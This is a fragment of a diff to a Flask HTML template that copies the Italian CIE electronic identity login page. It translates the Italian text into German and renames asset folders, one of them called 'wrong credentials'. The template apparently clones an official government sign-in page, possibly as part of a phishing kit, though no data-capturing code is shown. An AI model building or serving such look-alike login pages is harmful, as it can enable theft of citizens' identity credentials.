+									<a id="switch2L3" href="https://ios.idserver.servizicie.interno.gov.it/idp/login/app?opId=_e3d57b6001fe1cf6a2d8d719064c4660_521b7f3209e46c1e363c3a68c7714fab&amp;challenge=NGFLXVd%2FPwnh%2F8v1ihMy74GjDzQijXb5te%2F0%2B8on&amp;level=3&amp;SPName=https%3A%2F%2Fidpcwrapper.crs.lombardia.it%2Fmetadata%2Fsp-metadata-cie.xml&amp;SPLogo=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2Fimages%2Fcielogo.png&amp;value=e1s2&amp;nextUrl=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2FAuthn%2FX509&amp;name=conversation&amp;authnRequestString=_e3d57b6001fe1cf6a2d8d719064c4660_521b7f3209e46c1e363c3a68c7714fab&amp;OpText=Inserisci+le+ultime+4+cifre+del+PIN+ricevute+insieme+alla+tua+Carta+di+Identit%C3%A0+Elettronica+per+accedere+a+https%3A%2F%2Fidpcwrapper.crs.lombardia.it%2Fmetadata%2Fsp-metadata-cie.xml&amp;imgUrl=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2Fimages%2Fcielogo.png" class="btn btn-primary btn-image btn-card mb-2 text-nowrap w-100">Einloggen mit Lesen der Karte</a>
 								</div>
 							</div>
 	
@@ -636,11 +629,11 @@
 				<div class="col-12 col-lg-3">
 					<div class="row">
 						<div class="col-4">
-							<p class="mb-3 opacity">progetto di</p>
+							<p class="mb-3 opacity">Projekt von</p>
 						</div>
 						<div class="col">
-							<img src="{{url_for('static', filename='cie_wrong_credentials_it/ministero_white.png')}}" alt="Ministero dell&#39;Interno">
-							<img src="{{url_for('static', filename='cie_wrong_credentials_it/ipzs.png')}}" alt="Istituto Poligrafico e Zecca dello Stato Italiano" class="mt-2">
+							<img src="{{ url_for('static', filename='cie_login_it/ministero_white.png') }}" alt="Ministero dell&#39;Interno">
+							<img src="{{ url_for('static', filename='cie_login_it/ipzs.png') }}" alt="Istituto Poligrafico e Zecca dello Stato Italiano" class="mt-2">
 						</div>
 					</div>
 				</div>
@@ -650,11 +643,11 @@
 						<div class="mb-3"><strong>CieID App</strong></div>
 						<div class="row">
 							<div class="col-3">
-								<img src="{{url_for('static', filename='cie_wrong_credentials_it/cieid.png')}}" class="img-fluid cieid" alt="Logo App CieID">
+								<img src="{{ url_for('static', filename='cie_login_it/cieid.png') }}" class="img-fluid cieid" alt="Logo App CieID">
 							</div>
 							<div class="col">
 								<p class="mb-1">
-									L'app che ti consente di accedere ai servizi in rete utilizzando la tua identità digitale CieID
+									Die App, die Ihnen den Zugang zu den Online-Diensten mit Ihrer digitalen Identität CieID ermöglicht.
 								</p>
 							</div>
 						</div>
@@ -663,10 +656,10 @@
 				<div class="col-12 col-lg-4 my-auto stores d-none d-sm-flex">
 					<div class="row">
 						<div class="col text-right">
-							<a href="https://apps.apple.com/it/app/cieid/id1504644677" title="Scarica l&#39;app dallo Store Apple" target="_blank"><img src="{{url_for('static', filename='cie_wrong_credentials_it/appstore')}}@2x.png" class="img-fluid" alt="App Store"></a>
+							<a href="https://apps.apple.com/it/app/cieid/id1504644677" title="Laden Sie die App vom Apple Store herunter" target="_blank"><img src="{{ url_for('static', filename='cie_login_it/appstore@2x.png') }}" class="img-fluid" alt="App Store"></a>
 						</div>
 						<div class="col">
-							<a href="https://play.google.com/store/apps/details?id=it.ipzs.cieid&amp;hl=it" title="Scarica l&#39;app dal Play Store Google" target="_blank"><img src="{{url_for('static', filename='cie_wrong_credentials_it/googleplay')}}@2x.png" class="img-fluid" alt="Google Play"></a>
+							<a href="https://play.google.com/store/apps/details?id=it.ipzs.cieid&amp;hl=it" title="Laden Sie die App vom Google Play Store herunter" target="_blank"><img src="{{ url_for('static', filename='cie_login_it/googleplay@2x.png') }}" class="img-fluid" alt="Google Play"></a>
 						</div>
 					</div>
 				</div>
